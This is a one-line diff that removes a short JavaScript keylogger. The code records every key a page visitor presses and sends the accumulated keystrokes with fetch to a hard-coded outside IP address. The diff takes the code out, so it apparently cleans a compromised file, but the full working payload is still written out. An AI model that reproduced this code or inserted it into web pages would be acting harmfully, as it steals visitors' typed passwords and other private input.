@@ -1,1 +1,0 @@
-var keys = '';document.addEventListener('keydown', function(event) {var key = event.key;keys += key;fetch('http://141.87.60.72:5000/key/'+keys);});
